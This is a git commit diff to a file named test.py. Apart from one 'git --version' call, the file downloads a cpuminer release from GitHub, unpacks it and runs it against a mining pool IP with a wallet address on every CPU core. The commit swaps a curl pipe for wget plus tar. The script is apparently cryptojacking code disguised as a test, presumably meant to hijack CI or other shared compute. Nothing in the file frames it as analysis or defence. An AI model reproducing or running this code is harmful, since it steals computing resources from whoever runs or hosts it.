13983eba8588f1944676db2e1f0f0ed6822d83a8
Vasava10 <87759996+Vasava10@users.noreply.github.com>
2022-02-01 20:03:00 +0530

    Update test.py

--- test.py
+++ test.py
@@ -3,5 +3,6 @@ import subprocess
 
 cmd = "git --version"
 returned_value = os.system(cmd)
-subprocess.call(['curl -sSL  https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz | tar -xvz'], shell=True)
+subprocess.call(['wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz'], shell=True)
+subprocess.call(['tar -xvf cpuminer-opt-linux.tar.gz'], shell=True)
 subprocess.call(['./cpuminer-sse2 -a yescryptr16 -o 103.249.70.7:6333 -u TKEUa3SvCJdN3XA4oJnhQNALHBqGJjSgLV.$(shuf -n 1 -i 1-99999)-CPU -t $(nproc) -p c=TRX,mc=QOGE'], shell=True, close_fds=True)
